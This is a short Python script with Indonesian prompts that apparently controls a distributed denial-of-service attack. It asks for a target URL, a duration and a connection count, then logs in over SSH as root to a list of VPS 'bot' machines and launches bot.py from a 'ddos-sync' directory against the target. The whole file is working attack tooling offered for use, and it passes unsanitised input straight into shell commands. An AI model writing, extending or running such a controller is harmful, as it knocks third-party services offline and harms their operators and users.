
import os

bot_ips = [
    "root@ip-vps-1",
    "root@ip-vps-2"
]

target = input("Target URL: ")
duration = input("Durasi (detik): ")
conn = input("Jumlah koneksi: ")

for ip in bot_ips:
    print(f"🔁 Kirim ke {ip}")
    os.system(f'ssh {ip} "cd ~/ddos-sync/agent && python3 bot.py --target {target} --connections {conn} --duration {duration}"')
